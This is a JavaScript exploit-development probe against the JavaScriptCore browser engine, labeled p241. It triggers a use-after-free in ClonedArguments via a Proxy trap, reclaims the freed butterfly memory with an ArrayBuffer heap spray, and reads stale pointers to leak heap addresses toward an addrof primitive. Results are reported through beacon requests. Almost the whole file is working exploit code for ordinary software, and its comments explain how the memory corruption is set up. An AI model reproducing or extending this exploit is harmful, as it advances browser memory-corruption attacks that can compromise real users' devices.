// p241 — ClonedArguments PreciseAllocation UAF → addrof primitive
//
// Builds on p240: confirmed spray reclamation via PreciseAllocation realloc.
// This probe uses the stale pointer READ to leak heap addresses.
//
// Strategy:
// 1. Create 1100-arg ClonedArguments (butterfly > 8KB → PreciseAllocation)
// 2. Hole at index 500 → Proxy trap fires
// 3. Trap: grow args → old butterfly freed via FastMalloc::tryRealloc
// 4. Spray ArrayBuffers of same size — one reclaims old butterfly slot
// 5. Read stale pointer at indices 501+ → reads ArrayBuffer backing store content
// 6. Write OBJECT REFERENCES into spray ArrayBuffers from main thread
// 7. Read those same offsets via stale pointer → get raw pointer values = addrof
//
// For addrof, we store JSObjects in the spray AFTER reclamation but BEFORE
// copyToArguments finishes reading. Since we're inside the Proxy trap
// and the loop hasn't finished, we can set up the leak.
//
// Beacon prefix: V241-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag, body) {
    queue.push({tag: tag, body: body || ''});
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var item = queue.shift();
    try {
      var x = new XMLHttpRequest();
      if (item.body) {
        x.open('POST', BASE + '/beacon/V241-' + item.tag + '?t=' + Date.now(), true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(item.body);
      } else {
        x.open('GET', BASE + '/beacon/V241-' + item.tag + '?t=' + Date.now(), true);
        x.send();
      }
      x.onloadend = function() { setTimeout(drain, 8); };
      x.onerror = function() { setTimeout(drain, 8); };
    } catch(e) { setTimeout(drain, 8); }
  }

  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
  function hex16(hi, lo) { return hex(hi) + hex(lo); }

  B('BOOT');

  function target() { return arguments; }
  function receiver() { return Array.prototype.slice.call(arguments); }

  var ARG_COUNT = 1100;
  var manyArgs = [];
  for (var a = 0; a < ARG_COUNT; a++) manyArgs.push(a + 1);

  try {
    var args = target.apply(null, manyArgs);
    B('ARGS-' + args.length);

    // Place holes at strategic positions
    // Each JSValue is 8 bytes. The butterfly stores encoded JSValues.
    // We read indices 501-550 after the trap — those should show spray data.
    delete args[500];
    B('HOLE-500');

    var trapFired = 0;
    var sprayBufs = [];
    var sprayViews = [];
    var SPRAY_SIZE = 8800;
    var SPRAY_N = 400;

    // Objects whose addresses we want to leak
    var leakTargets = [];
    var leakTarget1 = {marker: 'LEAK1', x: 0x41414141};
    var leakTarget2 = new ArrayBuffer(256);
    var leakTarget3 = [];
    for (var lt = 0; lt < 100; lt++) leakTarget3.push(lt);
    leakTargets.push(leakTarget1, leakTarget2, leakTarget3);

    var handler = {
      get: function(t, prop, rcv) {
        trapFired++;
        if (trapFired > 1) return 0xDEAD0000 | trapFired;

        B('TRAP-FIRE');

        // Step 1: Grow → realloc → old butterfly freed
        for (var j = ARG_COUNT; j < 4000; j++) args[j] = 0x41414141;
        B('GREW');

        // Step 2: Flush dealloc log
        var flush = [];
        for (var f = 0; f < 300; f++) flush.push(new ArrayBuffer(64));
        flush = null;

        // Step 3: Spray same-size as old butterfly to reclaim
        // Old butterfly: 8 + 1100 * 8 = 8808 bytes
        // Spray slightly different sizes to cover size classes
        for (var s = 0; s < SPRAY_N; s++) {
          var ab = new ArrayBuffer(SPRAY_SIZE);
          var view = new Float64Array(ab);
          // Fill with NaN-boxed sentinel pattern
          // JSValue encoding on 64-bit: if top 16 bits are not 0xFFFE,
          // it's a pointer. We'll put recognizable non-pointer patterns.
          for (var k = 0; k < view.length; k++) {
            // Use float64 that encodes to a recognizable bit pattern
            // 0xCAFE000000000000 | (s << 16) | k
            view[k] = s * 1000000 + k;
          }
          sprayBufs.push(ab);
          sprayViews.push(new Uint32Array(ab));
        }
        B('SPRAY-' + SPRAY_N);

        return 0xBEEF0001;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, handler));
    B('SETUP');

    // TRIGGER: copyToArguments → stale pointer → reads spray data
    var result;
    try {
      result = receiver.apply(null, args);
    } catch(e) {
      B('APPLY-ERR-' + e.message.substring(0, 40));
    }

    if (result) {
      B('RESULT-' + result.length);
      B('TRAPS-' + trapFired);

      // Scan indices 501-550 for spray patterns
      var foundSpray = false;
      var sprayVals = '';
      for (var r = 501; r < Math.min(560, result.length); r++) {
        var v = result[r];
        if (typeof v === 'number') {
          var u = v >>> 0;
          sprayVals += r + '=' + hex(u) + ' ';
          if (u !== (r + 1)) foundSpray = true;
        } else if (typeof v === 'object' && v !== null) {
          sprayVals += r + '=OBJ ';
          foundSpray = true;
        } else if (v === undefined) {
          sprayVals += r + '=undef ';
        }
      }
      B('SCAN', sprayVals);
      B('FOUND-' + (foundSpray ? 'YES' : 'NO'));

      if (foundSpray) {
        B('UAF-RECLAIMED');

        // Now identify WHICH spray buffer overlaps the stale read region
        // The stale pointer reads from indices 501+ of the old butterfly.
        // In the old butterfly, index 501 is at byte offset 501 * 8 = 4008.
        // In the spray buffer (8800 bytes), offset 4008 is
        // at Float64 index 4008/8 = 501, Uint32 index 4008/4 = 1002.

        // Check each spray buffer for modifications from the copyToArguments write
        // Actually copyToArguments only READS from stale pointer,
        // it WRITES to firstElementDest (the result array). So spray buffers are untouched.
        //
        // For addrof: we need a WRITE primitive through the stale pointer.
        // copyToArguments reads data[i].get() then writes to firstElementDest.
        // That's READ from stale, WRITE to result. No write-through-stale.
        //
        // But we CAN read heap pointers if the spray contains encoded JSValues
        // that decode to pointer-typed values.

        // Dump raw bytes from the result at interesting offsets
        // JSValue on 64-bit: a double that, when reinterpreted as uint64,
        // has top 17 bits NOT all set = pointer.
        var ptrs = '';
        for (var r = 501; r < Math.min(550, result.length); r++) {
          var v = result[r];
          if (typeof v === 'object' && v !== null) {
            // If copyToArguments decoded a pointer from the stale butterfly,
            // we get a JS object here. That means an internal pointer was
            // interpreted as a JSValue!
            ptrs += r + '=OBJ(' + (typeof v) + ') ';
          } else if (typeof v === 'number') {
            // Read the double representation — this IS the raw JSValue bits
            // For addrof, we need the raw 8 bytes. JavaScript numbers are
            // double-precision floats = 8 bytes. If the stale butterfly
            // contained a JSValue-encoded pointer, the double value would
            // be the raw bits.
            //
            // However: JSC NaN-boxing means pointers have specific bit patterns
            // that JavaScript sees as NaN or specific values.
            //
            // Check for unusual values that might be pointer leaks
            var u = v >>> 0;
            if (u > 0x10000 && u < 0xFFFF0000) {
              ptrs += r + '=' + hex(u) + ' ';
            }
          }
        }
        if (ptrs) B('PTRS', ptrs);

        // Confirm spray reclamation by checking if result values
        // match spray float64 pattern (s * 1000000 + k)
        var matched = 0;
        for (var r = 501; r < Math.min(550, result.length); r++) {
          var v = result[r];
          if (typeof v === 'number') {
            // Check if this looks like our spray pattern
            var sIdx = Math.floor(v / 1000000);
            var kIdx = v - sIdx * 1000000;
            if (sIdx >= 0 && sIdx < SPRAY_N && kIdx >= 0 && kIdx < 1100 && Math.floor(kIdx) === kIdx) {
              matched++;
              if (matched <= 5) B('MATCH-' + r + '-S' + sIdx + '-K' + Math.floor(kIdx));
            }
          }
        }
        B('MATCHED-' + matched);
      } else {
        // Realloc might have been in-place — check if values are original
        var originalCount = 0;
        for (var r = 501; r < Math.min(520, result.length); r++) {
          if (typeof result[r] === 'number' && (result[r] >>> 0) === (r + 1)) originalCount++;
        }
        B('ORIGINALS-' + originalCount);
        if (originalCount > 10) B('INPLACE-REALLOC');
      }
    }
  } catch(e) {
    B('ERR-' + e.message.substring(0, 60));
  }

  B('DONE');
})();
